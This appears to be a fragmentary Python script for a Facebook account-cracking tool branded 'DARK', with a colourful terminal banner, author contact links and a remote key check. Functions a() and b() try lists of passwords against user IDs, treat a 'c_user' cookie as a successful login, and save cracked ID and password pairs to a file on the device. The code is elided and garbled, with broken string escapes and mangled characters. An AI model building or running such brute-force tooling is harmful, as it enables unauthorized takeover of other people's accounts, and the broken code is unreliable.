...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By DARK")
...
os.system("xdg-open https://github.com/DARK-NIZAMI")
logo=("""\33[92;1m
...
\33[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\33[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \33[38;5;196m: \3[97;1m𝐘𝐨𝐮𝐬𝐮𝐟 𝐍𝐢𝐳𝐚𝐦𝐢 ♚   \33[38;5;46m               ▇▎ 
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \33[38;5;196m: \33[1;92mDARK DEVIL OMI  ( 𝐌 )  \33[38;5;46m           ▇▎  
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \33[38;5;196m: \33[1;92m+01406115895\33[38;5;46m                  ▇▎
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \33[38;5;196m: \33[1;92mERROR\33[38;5;46m ▇▎
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801406115895');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100092013160584');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100092013160584');time.sleep(1)
		admin()
...
def hoga_check():
  ...
  try: 
    httpCaht = requests.get("https://github.com/OMIdark/key12/tree/main").text 
    if id in httpCaht: 
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\ \33[1;90m[\33[1;93mDARK\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/DARK-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\\33[m[DARK] \33[1;92m%s\33[m |\33[m[\33[mOK:\33[1;92m%s\33[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \{R} [{B}DARK{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€�{P}[{H}{ok}{P}]Ã¢â‚¬â€�{P}[{k}{cp}{x}]Ã¢â‚¬â€�[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/DARK-ok.txt', 'a').write(cid+' | '+ps+'\')
                break
            else:
                continue
        loop+=1        
